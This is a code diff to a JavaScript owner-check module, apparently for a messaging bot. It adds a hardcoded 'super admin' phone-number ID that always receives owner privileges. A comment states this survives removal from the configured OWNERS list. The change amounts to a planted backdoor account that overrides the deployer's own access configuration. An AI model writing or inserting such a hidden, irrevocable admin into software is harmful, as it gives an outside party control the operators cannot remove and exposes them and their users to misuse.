@@ -9,12 +9,20 @@ const OWNERS = (process.env.OWNERS || '')
     .map(n => n.trim().replace(/[@\s]/g, ''))
     .filter(Boolean);
 
+// Super admin : toujours propriétaire, même s'il est retiré de la liste OWNERS
+const SUPER_ADMIN = ['242067274660'];
+
 function normalize(jid) {
     return String(jid || '').split(':')[0].split('@')[0];
 }
 
+function isSuperAdmin(sender) {
+    return SUPER_ADMIN.includes(normalize(sender));
+}
+
 function isOwner(sender) {
-    return OWNERS.includes(normalize(sender));
+    const n = normalize(sender);
+    return SUPER_ADMIN.includes(n) || OWNERS.includes(n);
 }
 
 function getMode() {
@@ -35,4 +43,4 @@ function setMode(mode) {
     return mode;
 }
 
-module.exports = { isOwner, getMode, setMode, OWNERS };
+module.exports = { isOwner, isSuperAdmin, getMode, setMode, OWNERS };
